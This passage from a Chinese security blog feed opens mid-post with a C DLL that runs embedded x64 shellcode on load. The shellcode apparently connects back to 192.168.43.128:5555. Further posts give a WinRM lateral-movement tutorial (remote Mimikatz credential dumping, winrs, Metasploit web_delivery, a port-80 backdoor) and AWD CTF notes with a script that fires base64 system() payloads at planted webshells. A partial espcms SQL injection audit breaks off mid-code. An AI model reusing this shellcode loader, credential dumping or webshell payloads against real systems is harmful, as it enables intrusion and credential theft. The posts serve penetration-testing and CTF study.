class="line">&quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9&quot;</span><br><span class="line">&quot;\x0d\xac\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45&quot;</span><br><span class="line">&quot;\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b&quot;</span><br><span class="line">&quot;\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01&quot;</span><br><span class="line">&quot;\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48&quot;</span><br><span class="line">&quot;\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9&quot;</span><br><span class="line">&quot;\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00&quot;</span><br><span class="line">&quot;\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5&quot;</span><br><span class="line">&quot;\x49\xbc\x02\x00\x15\xb3\xc0\xa8\x2b\x80\x41\x54\x49\x89\xe4&quot;</span><br><span class="line">&quot;\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68&quot;</span><br><span class="line">&quot;\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a&quot;</span><br><span class="line">&quot;\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89&quot;</span><br><span class="line">&quot;\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5&quot;</span><br><span class="line">&quot;\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba&quot;</span><br><span class="line">&quot;\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5&quot;</span><br><span class="line">&quot;\xe8\x93\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9&quot;</span><br><span class="line">&quot;\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5&quot;</span><br><span class="line">&quot;\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41&quot;</span><br><span class="line">&quot;\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41&quot;</span><br><span class="line">&quot;\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31&quot;</span><br><span class="line">&quot;\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8&quot;</span><br><span class="line">&quot;\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68\x00\x40&quot;</span><br><span class="line">&quot;\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5&quot;</span><br><span class="line">&quot;\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c&quot;</span><br><span class="line">&quot;\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41&quot;</span><br><span class="line">&quot;\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5&quot;;</span><br><span class="line"></span><br><span class="line">    void* exec = VirtualAlloc(0, sizeof(buffer), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    memcpy(exec, buffer, sizeof(buffer));</span><br><span class="line"></span><br><span class="line">    ((void(*) ())exec)();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain(HMODULE hModule,</span><br><span class="line">    DWORD  ul_reason_for_call,</span><br><span class="line">    LPVOID lpReserved</span><br><span class="line">) &#123;</span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">        HANDLE threadHandle;</span><br><span class="line">        threadHandle = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL);</span><br><span class="line">        break;</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br><span class="line">e</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>PE结构</category>
      </categories>
      <tags>
        <tag>PE结构</tag>
      </tags>
  </entry>
  <entry>
    <title>WinRM-横向移动</title>
    <url>/2021/09/26/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
    <content><![CDATA[<p><strong>WinRM 用于Windows远程管理，他允许管理员远程执行系统命令。通过HTTP(5985) 或 HTTPS SOAP(5986)进行执行，支持Kerberos以及NTLM身份验证以及基本身份验证。使用此服务需要管理员票据。</strong></p>
<p>假设我们已经获得一台内网服务器的管理员权限(对端服务器允许此用户登陆即可)，并且开启了WinRM管理服务器，那么我们可以利用凭证进行内网横向移动</p>
<span id="more"></span>

<p>开放端口5985的主机运行WInRM服务，可利用端口扫描工具进行探测确认。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV --open -p5985 <span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span><span class="number">-12</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926195057008.png" alt="image-20210926195057008"></p>
<p>如果此时端口5985打开但端口5986已经被关闭，此时WinRM服务配置为仅接受HTTP连接，并加密</p>
<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192658012.png" alt="image-20210926192658012"></p>
<p>利用Poershell Invoke-Command 可通过WinRM服务执行命令。</p>
<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192711834.png" alt="image-20210926192711834"></p>
<p>同时我们还可利用 <strong>WinRM</strong> 远程执行Mimikatz来导出内存中的票据，无需将Mimikatz放入目标机器中执行。</p>
<p>此处使用Mimikatz导出票据，前提条件是你已获得管理员权限，否则将会导出失败。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Import-Module ./Invoke-Mimikatz.ps1</span><br><span class="line">Invoke-Mimikatz -ComputerName TARGET</span><br></pre></td></tr></table></figure>

<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192725400.png" alt="image-20210926192725400"></p>
<p>利用导出的凭证，继续横向渗透。</p>
<p>对于不运行 <strong>WinRM</strong> 的系统，可以利用Powershell命令进行启用配置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Enable-PSRemoting -Force</span><br></pre></td></tr></table></figure>

<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192736459.png" alt="image-20210926192736459"></p>
<p>默认情况下，可能无法通过 WinRM 连接到另一个系统， 并且可能需要额外的配置。 以下配置可能帮助我们解决配置错误问题。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Winrm quickconfig</span><br><span class="line">winrm set winrm/config/client @&#123;AllowUnencrypted = &quot;true</span><br><span class="line">Set-Item WSMan:localhost\client\trustedhosts -value *</span><br></pre></td></tr></table></figure>

<h2 id="WinRs"><a href="#WinRs" class="headerlink" title="WinRs"></a>WinRs</h2><p>WinRS 是一个命令行工具，它是Windows 2008及更高版本的一部分。如果启用了WinRM,此实用程序可用于远程执行主机上的命令。在CMD参数上可建立一个新的远程cmd会话。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrs -r:http://10.10.10.12:5985 -u:administrator -p:xxxxx &quot;cmd&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192758398.png" alt="image-20210926192758398"></p>
<p>也可对其远程执行命令而非一个cmd会话，以便对目标远程探测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrs -r:http://10.10.10.12:5985 -u:administrator -p:xxxxx &quot;net localgroup administrators&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192808642.png" alt="image-20210926192808642"></p>
<p>也可利用msf 的 web_delivery模块远程无文件上线msf。此模块将生成一个将在本地托管的有效载荷，并将生成需要在目标上执行的powershell命令。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use multi/script/web_delivery</span><br></pre></td></tr></table></figure>

<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192818719.png" alt="image-20210926192818719"></p>
<p><strong>利用winrs远程执行:</strong></p>
<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192827384.png" alt="image-20210926192827384"></p>
<h2 id="元破解"><a href="#元破解" class="headerlink" title="元破解"></a>元破解</h2><p>MSF 有几个模块，可用于发现开启了WinRM服务的主机、发现凭证以进行服务身份验证以及执行任意命令和代码。以下模块可以发现启用了WinRM 服务的系统机器支持的身份验证协议。</p>
<h3 id="探测WinRM验证方式"><a href="#探测WinRM验证方式" class="headerlink" title="探测WinRM验证方式"></a>探测WinRM验证方式</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">auxiliary/scanner/winrm/winrm_auth_methods</span><br></pre></td></tr></table></figure>

<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192845668.png" alt="image-20210926192845668"></p>
<h3 id="探测票据有效性"><a href="#探测票据有效性" class="headerlink" title="探测票据有效性"></a>探测票据有效性</h3><p>如果已经获得服务器上的缓存票据，则这些票据可用于通过<strong>WinRM</strong>服务与其他主机进行身份验证。以下模块可检测票据是否对其他主机有效。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auxiliary/scanner/winrm/winrm_login </span><br></pre></td></tr></table></figure>

<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192855464.png" alt="image-20210926192855464"></p>
<h3 id="利用票据执行命令"><a href="#利用票据执行命令" class="headerlink" title="利用票据执行命令"></a>利用票据执行命令</h3><p>通过<strong>WinRM</strong> 服务执行任意命令。此模块需要本地管理员凭据、域和目标主机。</p>
<p>此处未能成功执行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auxiliary/scanner/winrm/winrm_cmd</span><br></pre></td></tr></table></figure>

<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192903042.png" alt="image-20210926192903042"></p>
<p>也可利用WinRM和以下模块执行命令。该模块需要本地管理员凭证和代码将执行的主机列表。此模块可用于横向移动到域内主机。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exploit/windows/winrm/winrm_script_exec</span><br></pre></td></tr></table></figure>

<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192912391.png" alt="image-20210926192912391"></p>
<h2 id="其他利用手段"><a href="#其他利用手段" class="headerlink" title="其他利用手段"></a>其他利用手段</h2><p>​    <strong>1.开启3389远程桌面控制</strong></p>
<p>​    若开启了WinRM,可利用PeekABoo工具或直接对注册表操作开启3389端口</p>
<p>​    <strong>2.端口复用做后门</strong></p>
<p>​    将WInRM监听端口由5985改为80或443等常用端口，及时端口被Web服务占用也不会影响，并且不会影响web服务的执行：</p>
<p>​    （1）配置目标WinRM服务，更改监听端口开启复用模式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrm set winrm/config/Listener?Address=*+Transport=HTTP @&#123;Port=&quot;80&quot;&#125;</span><br><span class="line">winrm set winrm/config/service @&#123;EnableCompatibilityHttpListener=&quot;true&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>​    （2）链接目标</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrs -r:http://192.168.1.152 -u:administrator -p:xxxx cmd</span><br></pre></td></tr></table></figure>

<p>​    此方法适用于存在web服务的主机，并不会再开启新端口，较为隐蔽。</p>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>awd知识梳理</title>
    <url>/2021/10/22/awd%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/</url>
    <content><![CDATA[<p>由于一个月后需要参加一项awd比赛，为了防止过去之后什么也不懂的情况发生，写下这篇笔记用于记录整理awd比赛可能会用到的一些零零碎碎的知识点。</p>
<h2 id="0X01-目录索引"><a href="#0X01-目录索引" class="headerlink" title="0X01 目录索引"></a>0X01 目录索引</h2><ol>
<li>加固阶段</li>
<li>攻防阶段</li>
</ol>
<span id="more"></span>

<h3 id="1-加固阶段"><a href="#1-加固阶段" class="headerlink" title="1.加固阶段"></a>1.加固阶段</h3><ol>
<li><p>修改ssh登陆密码</p>
<p>首先根据主办方提供的ssh账号登陆到我们的服务器，并在第一时间下通过passwd修改密码，最好改为强密码，避免其他队伍通过弱口令或默认口令进入我们服务器。<img src="/images/awd%E8%B5%9B%E9%A1%B9%E7%90%90%E7%A2%8E%E7%9F%A5%E8%AF%86%E7%82%B9.assets/image-20211022155257543.png" alt="image-20211022155257543"></p>
</li>
<li><p>备份mysql数据库、网站源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mysqldump -uroot -p 数据库名 &gt; 备份文件 <span class="comment">#进行数据库备份</span></span><br><span class="line">source C:\User\<span class="number">86156</span>\Desktop\web\test.sql <span class="comment">#进入数据库，将数据库备份文件导入</span></span><br><span class="line">tar -czvf 打包文件.tar.gz  打包目录 </span><br><span class="line">tar -zxvf 打包文件  <span class="comment">#解压打包文件</span></span><br><span class="line">利用python3 -m http.server <span class="number">8080</span>| python -m SimpleHTTPServer <span class="number">8080</span>|scp 命令将文件传输至本机进行审计</span><br><span class="line">   </span><br></pre></td></tr></table></figure></li>
<li><p>进入web主目录审计源码，查找隐藏后门文件以及webshell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -al #列出目录内所有文件，避免.xxx.php 从而被隐藏后门文件。</span><br><span class="line">crontab -e #查看计划任务表</span><br><span class="line">cat /etc/crontab </span><br></pre></td></tr></table></figure>

<p><img src="/images/awd%E8%B5%9B%E9%A1%B9%E7%90%90%E7%A2%8E%E7%9F%A5%E8%AF%86%E7%82%B9.assets/image-20211022161419311.png" alt="image-20211022161419311"></p>
</li>
<li><p>利用find | xrags grep “xxx” 粗略查找网站中的隐藏后门，找到后对其进行删除操作</p>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">find /<span class="keyword">var</span>/www/html |xargs grep <span class="string">&quot;system&quot;</span> </span><br><span class="line"><span class="comment">#system、eval、assert、exec、passthru、shell_exec都要留心查一下</span></span><br><span class="line"><span class="comment">#include、require、include_once 、require_once等包含函数也可留意</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/awd%E8%B5%9B%E9%A1%B9%E7%90%90%E7%A2%8E%E7%9F%A5%E8%AF%86%E7%82%B9.assets/image-20211022161723171.png" alt="image-20211022161723171"></p>
<p>​            5.后门排查完毕后，对代码进行审计，重点查看upload以及sql，若主办方还提供D盾等排查后门工具，可一起利用d盾进行后门排查</p>
<p><img src="/images/awd%E8%B5%9B%E9%A1%B9%E7%90%90%E7%A2%8E%E7%9F%A5%E8%AF%86%E7%82%B9.assets/image-20211022163226399.png" alt="image-20211022163226399"></p>
<h3 id="2-攻防阶段"><a href="#2-攻防阶段" class="headerlink" title="2.攻防阶段"></a>2.攻防阶段</h3><p>1安排上流量监控脚本，筛选其他攻击队的可利用payload放入自己武器库之中</p>
<p>使用时需要将waf.php include包含进文件之中。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">define(<span class="string">&#x27;LOG_FILEDIR&#x27;</span>,<span class="string">&#x27;./logs&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">&#x27;getallheaders&#x27;</span>)) &#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getallheaders</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_SERVER</span> <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (substr(<span class="variable">$name</span>, <span class="number">0</span>, <span class="number">5</span>) == <span class="string">&#x27;HTTP_&#x27;</span>)</span><br><span class="line"><span class="variable">$headers</span>[str_replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;-&#x27;</span>, ucwords(strtolower(str_replace(<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27; &#x27;</span>, substr(<span class="variable">$name</span>, <span class="number">5</span>)))))] = <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$headers</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$get</span> = <span class="variable">$_GET</span>;</span><br><span class="line"><span class="variable">$post</span> = <span class="variable">$_POST</span>;</span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_COOKIE</span>;</span><br><span class="line"><span class="variable">$header</span> = getallheaders();</span><br><span class="line"><span class="variable">$files</span> = <span class="variable">$_FILES</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line"><span class="variable">$method</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>];</span><br><span class="line"><span class="variable">$filepath</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_NAME&quot;</span>];</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_FILES</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="variable">$files</span>[<span class="variable">$key</span>][<span class="string">&#x27;content&#x27;</span>] = file_get_contents(<span class="variable">$_FILES</span>[<span class="variable">$key</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">file_put_contents(<span class="variable">$_FILES</span>[<span class="variable">$key</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&quot;virink&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$header</span>[<span class="string">&#x27;Accept&#x27;</span>]);</span><br><span class="line"><span class="variable">$input</span> = <span class="keyword">array</span>(<span class="string">&quot;Get&quot;</span>=&gt;<span class="variable">$get</span>, <span class="string">&quot;Post&quot;</span>=&gt;<span class="variable">$post</span>, <span class="string">&quot;Cookie&quot;</span>=&gt;<span class="variable">$cookie</span>, <span class="string">&quot;File&quot;</span>=&gt;<span class="variable">$files</span>, <span class="string">&quot;Header&quot;</span>=&gt;<span class="variable">$header</span>);</span><br><span class="line"></span><br><span class="line">logging(<span class="variable">$input</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logging</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="variable">$LOG_FILENAME</span> = LOG_FILEDIR.<span class="string">&quot;/&quot;</span>.<span class="variable">$filename</span>;</span><br><span class="line"><span class="variable">$time</span> = date(<span class="string">&quot;Y-m-d G:i:s&quot;</span>);</span><br><span class="line">file_put_contents(<span class="variable">$LOG_FILENAME</span>, <span class="string">&quot;\r\n&quot;</span>.<span class="variable">$time</span>.<span class="string">&quot;\r\n&quot;</span>.print_r(<span class="variable">$var</span>, <span class="literal">true</span>), FILE_APPEND);</span><br><span class="line">file_put_contents(<span class="variable">$LOG_FILENAME</span>,<span class="string">&quot;\r\n&quot;</span>.<span class="string">&#x27;http://&#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>].<span class="string">&#x27;?&#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], FILE_APPEND);</span><br><span class="line">file_put_contents(<span class="variable">$LOG_FILENAME</span>,<span class="string">&quot;\r\n***************************************************************&quot;</span>,FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">waf();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">   </span><br></pre></td></tr></table></figure>

<p>同时可联用apache、nginx的日志文件，通过grep筛查拿到可利用payload</p>
<p>2.根据后门文件写批量拿flag脚本，人菜写的脚本烂，诸位师傅别骂哈</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"><span class="comment">###  目前需求如下：</span></span><br><span class="line"><span class="comment"># 1，第一遍拿到存活主机并尝试通过get方式拿到flag，并将flag存入文件内</span></span><br><span class="line"><span class="comment"># 2. 回显为空的，将存活Ip放入一个Post_url列表中，再在下方通过post_getflag方式走一遍流程，尝试拿flag</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#利用Get请求方式请求flag</span></span><br><span class="line"></span><br><span class="line">def get_flag(url,payload,flag,header):</span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">1</span>,<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;开始探测:&quot;</span>,url.format(i))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.get(url.format(i),params=payload,timeout=<span class="number">2</span>,headers=header)</span><br><span class="line">            res.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;状态码:&quot;</span>,res.status_code)</span><br><span class="line">            <span class="keyword">if</span> (flag in str(res.text)):</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&quot;Get flag successful!&quot;</span>)</span><br><span class="line">                f = open(<span class="string">&quot;getflag.txt&quot;</span>, mode=<span class="string">&quot;a&quot;</span>)</span><br><span class="line">                f.write(res.text)</span><br><span class="line">                f.close()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> (res.status_code == <span class="number">200</span>):</span><br><span class="line">                    post_urls.append(url.format(i))</span><br><span class="line">                    <span class="comment"># f = open(&quot;Post_getflag.txt&quot;, mode=&quot;a&quot;)</span></span><br><span class="line">                    <span class="comment"># #利用\r\n将写入的数据换行</span></span><br><span class="line">                    <span class="comment"># f.write(url.format(i)+&quot;\r&quot;)</span></span><br><span class="line">                    <span class="comment"># f.close()</span></span><br><span class="line"></span><br><span class="line">        except requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            e</span><br><span class="line"></span><br><span class="line"><span class="comment">#POST抓取flag</span></span><br><span class="line">def post_Getflag(payload,flag):</span><br><span class="line">    data=&#123;&#125;</span><br><span class="line">    data[<span class="string">&#x27;pass&#x27;</span>]=<span class="string">&quot;c3lzdGVtKCJtb3JlIGZsYWcudHh0Iik7&quot;</span></span><br><span class="line">    <span class="keyword">for</span> url in post_urls:</span><br><span class="line">        <span class="keyword">print</span>(url)</span><br><span class="line">        res = requests.post(url,data=data,timeout=<span class="number">2</span>)</span><br><span class="line">        res.encoding=<span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">        <span class="keyword">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#@eval(base64_decode($_POST[pass]));    一句话木马</span></span><br><span class="line"><span class="comment">#system(&quot;more flag.txt&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#开始嗨皮</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">#此处偷了个懒，默认按照192.168.155.0/24段内的主机是awd内网靶机环境</span></span><br><span class="line">    url = <span class="string">&quot;http://192.168.155.&#123;0&#125;/pcap.php&quot;</span></span><br><span class="line">    payload = <span class="string">&quot;&quot;</span><span class="string">&quot;c3lzdGVtKCJtb3JlIGZsYWcudHh0Iik7&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    flag = <span class="string">&quot;flag&#123;&quot;</span></span><br><span class="line">    post_urls=[]</span><br><span class="line">    get_flag(url,payload,flag,header)</span><br><span class="line">    post_Getflag(payload,flag,header)</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;完成！&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>在获取flag的时候，还可以通过写入不死马、计划任务上马等手段进行权限维持，避免后门被清理无法再下轮flag投放时获取不到。</p>
<p>简单来说，攻防阶段主要是快速编写批量爆破flag脚本并运行读取，另外根据日志或流控脚本发现其他未修复漏洞进行及时修复避免失分。</p>
<p>今天先更新到这里，以后如果还有其他内容还会陆续更新本文….</p>
]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>php代码审计学习-4</title>
    <url>/2021/10/26/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-4/</url>
    <content><![CDATA[<p>​    </p>
<h3 id="espcms-审计"><a href="#espcms-审计" class="headerlink" title="espcms 审计"></a>espcms 审计</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">资源下载:http:<span class="comment">//down.chinaz.com/soft/27695.htm</span></span><br></pre></td></tr></table></figure>

<p>解压安装后，利用esay审计系统进行自动化审计，筛选可疑语句。</p>
<p>看到一处普通的sql查询语句，右键跟进打开文件</p>
<p>可以看到，SQL查询在一个类的自定义函数<code>oncitylist</code>之内</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  PHP version 5</span></span><br><span class="line"><span class="comment">  Copyright (c) 2002-2010 ECISP.CN</span></span><br><span class="line"><span class="comment">  声明：这不是一个免费的软件，请在许可范围内使用</span></span><br><span class="line"><span class="comment">  作者：Bili E-mail:huangqyun@163.com  QQ:6326420</span></span><br><span class="line"><span class="comment">  http://www.ecisp.cn	http://www.easysitepm.com</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">important</span> <span class="keyword">extends</span> <span class="title">connector</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">important</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;softbase(<span class="literal">true</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">oncitylist</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$parentid</span> = <span class="keyword">$this</span>-&gt;fun-&gt;accept(<span class="string">&#x27;parentid&#x27;</span>, <span class="string">&#x27;R&#x27;</span>);</span><br><span class="line">		<span class="variable">$parentid</span> = <span class="keyword">empty</span>(<span class="variable">$parentid</span>) ? <span class="number">1</span> : <span class="variable">$parentid</span>;</span><br><span class="line">		<span class="variable">$verid</span> = <span class="keyword">$this</span>-&gt;fun-&gt;accept(<span class="string">&#x27;verid&#x27;</span>, <span class="string">&#x27;R&#x27;</span>);</span><br><span class="line">		<span class="variable">$verid</span> = <span class="keyword">empty</span>(<span class="variable">$verid</span>) ? <span class="number">0</span> : <span class="variable">$verid</span>;</span><br><span class="line">		<span class="variable">$db_table</span> = db_prefix . <span class="string">&#x27;city&#x27;</span>;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;select * from <span class="subst">$db_table</span> where parentid=<span class="subst">$parentid</span>&quot;</span>;</span><br><span class="line">		<span class="variable">$rs</span> = <span class="keyword">$this</span>-&gt;db-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$rsList</span> = <span class="keyword">$this</span>-&gt;db-&gt;fetch_array(<span class="variable">$rs</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span 